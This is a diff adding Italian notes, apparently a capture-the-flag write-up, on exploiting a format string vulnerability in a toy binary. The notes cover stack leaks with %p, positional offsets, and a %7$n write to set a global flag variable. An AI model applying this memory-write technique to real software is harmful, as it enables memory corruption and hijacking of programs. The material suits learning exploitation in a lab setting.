@@ -1,0 +1,42 @@
+Format String Vulnerability
+https://www.w3tutorials.net/blog/format-string-vulnerability-printf/
+
+(VARIABILE GLOBALE)
+flag                                            XREF[2]:     Entry Point(*), main:00401226(R)  
+0040404c 00 00 00 00     undefined4 00000000h
+
+(CODICE)
+fgets(local_38,0x20,stdin);
+printf(local_38);
+if (flag != 0) {
+  printFlag();
+}
+
+-----------------------------------------------------------------------------------------------------------------------------------
+| %x, %p, %s              =>   legge dalla memoria                                                                                |
+| %n                      =>   scrive in memoria (se non ci sono argomenti, come in questo caso, prende l'indirizzo prima di %n)  |
+| %<offset>$<formato>     =>   notazione posizionale, dato offset stack stampa il valore in uno dei formati sopra                 |
+-----------------------------------------------------------------------------------------------------------------------------------
+
+
+------ TEST 1 ------
+Hello, what's your name?
+AAAAA %p %p %p %p %p %p %p %p
+
+AAAAA 0x7ffff7f8f963 0xfbad208b 0x7fffffffd630 (nil) (nil) 0x7025204141414141 0x2520702520702520 0x2070252070252070
+                                                                ^
+                                                                |
+                                                            (%)-(p)-( )-(A)-(A)-(A)-(A)-(A)
+
+------ TEST 2 ------
+python3 solution.py
+
+['0x7024362541414141']     =>      %6$p
+['0x40000a']     =>      %7$p               --> possibile indirizzo di ritorno della funzione
+
+------ TEST 3 ------
+python3 solution.py
+
+Se inserisco "   %7$n   " + <indirizzo>, printf prima scrive tutto nello stack, come valori ASCII.
+Dopo che ha scritto nello stack, esegue un controllo di ciò che è stato scritto e in questo caso scrive il valore " " alla settima posizione,
+che è stata sovrascritta con il valore dell'indirizzo, e printf la interpreta come puntatore e ci va a scrivere sopra.
